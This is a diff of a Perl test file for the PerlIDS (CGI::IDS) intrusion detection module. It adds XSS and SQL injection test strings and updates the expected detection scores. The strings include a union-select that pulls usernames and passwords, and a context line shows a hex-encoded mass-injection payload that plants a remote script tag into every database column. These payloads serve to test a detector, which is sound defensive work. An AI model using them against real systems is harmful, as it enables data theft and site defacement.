@@ -3,7 +3,7 @@
 #   01_ids.t
 # DESCRIPTION
 #   Tests for PerlIDS (CGI::IDS)
-#   based on PHPIDS http://php-ids.org tests/IDS/MonitorTest.php rev. 1240
+#   based on PHPIDS http://php-ids.org tests/IDS/MonitorTest.php rev. 1245
 # AUTHOR
 #   Hinnerk Altenburg <hinnerk@cpan.org>
 # CREATION DATE
@@ -401,6 +401,7 @@ my %testXSSList = (
                         this .fdgsdfgsdfgdsfgdsfg
                         aaaaaaaaaaaaaaaa :-(alert||foo)(1)||foo",
 	32  => "(this)[new Array+('eva')+new Array+ 'l'](/foo.bar/+name+/foo.bar/)",
+	33  => '<video/title=.10000/aler&#x74;(1) onload=.1/setTimeout(title)>',
 );
 
 my %testSelfContainedXSSList = (
@@ -685,6 +686,11 @@ my %testSQLIList6 = (
 	7 => "'DECLARE%20\@S%20CHAR(4000);SET%20\@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));EXEC(\@S);';",
 	8 => "asaa';SELECT[asd]FROM[asd]",
 	9 => "asd'; select [column] from users ",
+	10 => "0x31 union select @"."@"."version,username,password from users ",
+    11 => "1 order by if(1<2 ,uname,uid) ",
+    12 => "1 order by ifnull(null,userid) ",
+    13 => "2' between 1 and 3 or 0x61 like 'a",
+    14 => "4' MOD 2 like '0",
 );
 
 my %testDTList = (
@@ -973,20 +979,20 @@ print testmessage("test converters and filters");
 is ($ids->detect_attacks(request => \%testAttributeBreakerList),			43,			"testAttributeBreakerList");
 is ($ids->detect_attacks(request => \%testCommentList),						9,			"testCommentList");
 is ($ids->detect_attacks(request => \%testConcatenatedXSSList),				1130,		"testConcatenatedXSSList");
-is ($ids->detect_attacks(request => \%testConcatenatedXSSList2),			842,		"testConcatenatedXSSList2");
+is ($ids->detect_attacks(request => \%testConcatenatedXSSList2),			847,		"testConcatenatedXSSList2");
 is ($ids->detect_attacks(request => \%testXMLPredicateXSSList),				148,		"testXMLPredicateXSSList");
 is ($ids->detect_attacks(request => \%testConditionalCompilationXSSList),	87,			"testXMLPredicateXSSList");
-is ($ids->detect_attacks(request => \%testXSSList),							536,		"testXSSList");
+is ($ids->detect_attacks(request => \%testXSSList),							563,		"testXSSList");
 is ($ids->detect_attacks(request => \%testSelfContainedXSSList),			513,		"testSelfContainedXSSList");
 is ($ids->detect_attacks(request => \%testSQLIList),						485,		"testSQLIList");
-is ($ids->detect_attacks(request => \%testSQLIList2),						586,		"testSQLIList2");
+is ($ids->detect_attacks(request => \%testSQLIList2),						591,		"testSQLIList2");
 is ($ids->detect_attacks(request => \%testSQLIList3),						597,		"testSQLIList3");
 is ($ids->detect_attacks(request => \%testSQLIList4),						768,		"testSQLIList4");
-is ($ids->detect_attacks(request => \%testSQLIList5),						859,		"testSQLIList5");
-is ($ids->detect_attacks(request => \%testSQLIList6),						206,		"testSQLIList6");
+is ($ids->detect_attacks(request => \%testSQLIList5),						866,		"testSQLIList5");
+is ($ids->detect_attacks(request => \%testSQLIList6),						256,		"testSQLIList6");
 is ($ids->detect_attacks(request => \%testDTList),							126,		"testDTList");
 is ($ids->detect_attacks(request => \%testURIList),							156,		"testURIList");
-is ($ids->detect_attacks(request => \%testRFEList),							487,		"testRFEList");
+is ($ids->detect_attacks(request => \%testRFEList),							495,		"testRFEList");
 is ($ids->detect_attacks(request => \%testUTF7List),						78,			"testUTF7List");
 is ($ids->detect_attacks(request => \%testBase64CCConverter),				95,			"testBase64CCConverter");
 is ($ids->detect_attacks(request => \%testDecimalCCConverter),				72,			"testDecimalCCConverter");
